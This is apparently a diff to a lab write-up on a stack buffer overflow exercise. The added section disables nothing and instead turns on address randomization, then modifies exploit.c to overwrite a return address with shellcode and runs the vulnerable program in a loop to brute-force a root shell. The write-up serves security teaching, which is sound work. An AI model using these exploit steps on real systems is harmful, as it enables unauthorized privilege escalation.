@@ -93,3 +93,31 @@ You should see a **#** here, which means you've got a root shell! You can check 
 
     id
     whoami
+
+# Task 2: Address Randomization
+
+First turn on address randomization and try to run `stack`:
+
+    sudo sysctl -w kernel.randomize_va_space=2
+    ./stack
+
+You should see a different output address, and an error `Segmentation fault (core dumped)` occered.
+
+## edit `exploit.c`
+
+Replace `BUF` with the address shown above, and change the destiny of `srtcpy` to the end of `buffer` as long as it can hold shellcode:
+
+```c
+long addr = BUF + OFFSET + 4;
+long *ptr = (long *) (buffer + OFFSET);
+*ptr = addr;
+strcpy(buffer + 480, shellcode);
+```
+
+## complie `exploit.c` and run `stack` in a loop
+
+    gcc -o exploit exploit.c
+    ./exploit
+    sh -c "while [ l ]; do ./stack; done;"
+
+Wait for a while until you get a root shell again!
